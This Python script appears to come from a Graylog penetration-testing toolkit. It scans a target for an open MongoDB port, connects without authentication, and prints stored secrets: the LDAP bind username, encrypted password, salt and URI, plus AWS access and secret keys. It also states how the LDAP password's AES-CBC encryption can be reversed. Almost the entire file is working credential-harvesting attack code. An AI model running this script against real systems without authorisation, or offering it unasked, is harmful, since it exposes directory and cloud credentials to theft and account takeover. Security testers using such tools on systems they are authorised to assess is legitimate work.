#!/usr/bin/env python3

# Graylog Test Connection to MongoDB without Authentication and Read Sensitive Information

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import colorama
import logging
import nmap
from colorama import Fore, Style
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure

colorama.init()

# %%%%%%%%%%% Constants %%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)
MONGODB_PORT = 27017

# %%%%%%%%%% Functions %%%%%%%%%#

def test_mongo_credentials(graylogip):

	nm = nmap.PortScanner()

	try:
		nm.scan(hosts = graylogip, arguments = '-sT -T4 -p 27017')

		if nm[graylogip]['tcp'][MONGODB_PORT]['state'] == 'open':

			try:
				client = MongoClient(graylogip, MONGODB_PORT)
				db = client.graylog
				print(SEPARATOR)
				print(Fore.RED + Style.BRIGHT + "[!] Mongo DB without Authentication" + Style.RESET_ALL)
				print(SEPARATOR)
				print("[!] LDAP Settings")
				print(SEPARATOR)

				ldapusername = list(db.ldap_settings.find({}, {'system_username': 1, '_id': 0}))
				ldappass = list(db.ldap_settings.find({}, {'system_password': 1, '_id': 0}))
				ldapsalt = list(db.ldap_settings.find({}, {'system_password_salt': 1, '_id': 0}))
				ldapuri = list(db.ldap_settings.find({}, {'ldap_uri': 1, '_id': 0}))

				print("[!] " + (str(ldapusername)).strip(' [{}]'))
				print("[!] " + (str(ldappass)).strip(' [{}]'))
				print("[!] " + (str(ldapsalt)).strip(' [{}]'))
				print("[!] " + (str(ldapuri)).strip(' [{}]'))

				print(SEPARATOR)
				print(
					"[!] LDAP Password Encrypted with AES CBC, Key is Graylog PasswordSecret and IV" 
					" is the Salt")

				awsaccesskey = list(
					db.cluster_config.find({'type': 'org.graylog.aws.config.AWSPluginConfiguration'},
											{'payload.access_key': 1, '_id': 0}))
				accesskey = str(awsaccesskey).replace('payload', '').strip('[{}]').replace("'': {", '')
				awssecretkey = list(
					db.cluster_config.find({'type': 'org.graylog.aws.config.AWSPluginConfiguration'},
											{'payload.secret_key': 1, '_id': 0}))
				secretkey = str(awssecretkey).replace('payload', '').strip('[{}]').replace("'': {", '')

				print(SEPARATOR)
				print("[!] AWS Access Key and Secret Key")
				print(SEPARATOR)
				print("[!] " + accesskey)
				print("[!] " + secretkey)
				print(SEPARATOR)

			except ConnectionFailure:
				print(SEPARATOR)
				print("[!] Problem with MongoDB Authentication")
				print(SEPARATOR)

		else:
			print(SEPARATOR)
			print("[!] MongoDB port is closed or unreachable")
			print(SEPARATOR)

	except Exception as e:
		logging.error(e, exc_info = True)

# %%%%%%%%%% The End %%%%%%%%%%#
